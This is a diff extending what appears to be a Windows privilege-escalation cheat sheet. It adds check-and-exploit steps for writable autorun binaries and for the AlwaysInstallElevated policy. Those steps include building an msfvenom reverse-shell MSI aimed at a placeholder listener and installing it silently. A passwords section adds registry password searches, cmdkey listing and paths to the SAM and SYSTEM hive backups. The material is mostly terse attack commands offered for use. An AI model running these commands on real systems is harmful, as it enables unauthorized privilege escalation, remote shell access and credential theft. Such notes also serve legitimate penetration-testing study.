@@ -59,4 +59,28 @@ net start regsvc
 how to check?
 
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run # get autoruns
-accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe" # check on write permission
+accesschk.exe /accepteula -wvu "path" # check on write permission
+
+exploit
+
+copy "path_to_shell" "path" /Y
+restart machine
+
+------ALWAYSINSTALLELEVATED------
+
+how to check?
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # 0x1
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # 0x1
+
+exploit
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f msi -o reverse.msi
+msiexec /quiet /qn /i "path_to_shell"
+
+------PASSWORDS------
+
+reg query HKLM /f password /t REG_SZ /s
+cmdkey /list
+C:\Windows\Repair\SAM
+C:\Windows\Repair\SYSTEM
